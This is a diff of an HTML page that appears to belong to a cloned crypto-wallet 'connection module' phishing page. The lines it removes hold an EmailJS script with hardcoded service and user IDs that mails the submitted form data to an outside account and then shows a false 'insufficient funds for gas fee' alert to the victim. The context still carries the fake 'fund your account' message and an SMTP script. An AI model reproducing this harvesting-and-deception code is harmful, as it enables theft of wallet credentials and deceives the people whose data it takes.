@@ -128,27 +128,10 @@ Kindly fund your account and try again later</p></center>
             </div>
             
     </section>
-    <script>
-        function thankyou_message() {
-            var form = document.querySelector('form');
-            var thankyouMessage = document.querySelector('.thankyou_message');
-            if (form.value != null || form.value != "") {
-                thankyouMessage.style.display == "block";
-            } else {
-                thankyouMessage.style.display == "none";
-            }
-        }
-        // var form = document.getElementsByTagName('form')
-        // if (form.value != null) {
-        //     function thankyou_message() {
-        //         var thankyou_message = document.querySelector('thankyou_message')
-        //         thankyou_message.style.display == "block";
-        //     }
-        // }
-    </script>
+    
     <script src="js/mine.js"></script>
     <script src="../smtpjs.com/v3/smtp.html"></script>
-    <script data-cfasync="false" type="text/javascript" src="js/form-submission-handler.js"></script>
+ 
     <script src="flowbite-1.5.3/dist/flowbite.js"></script>
    
     
@@ -160,22 +143,7 @@ Kindly fund your account and try again later</p></center>
         </script>
 
         <!-- Add EmailJS SDK and sendEmail function before </body> -->
-<script src="../../cdn.emailjs.com/dist/email.min.js"></script>
-<script>
-(function(){
-    emailjs.init("SJbej_H6qXc0loOex"); // Replace with your EmailJS user ID
-})();
-function sendEmail(form, template_6jo5dtv) {
-    emailjs.sendForm('service_hdr6yam', template_6jo5dtv, form)
-        .then(function() {
-            alert('OOps, insuffienct funds, does not have enough funds required for gas fee. Kindly fund your account and try again later!');
-            form.reset();
-        }, function(error) {
-            alert('Submission failed: ' + JSON.stringify(error));
-        });
-    return false; // Prevent default form submission
-}
-</script>
+
 </body>
 
 <!-- Developed by Sammyloaded Concepts/connection-module/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 19 Jun 2024 19:53:35 GMT -->
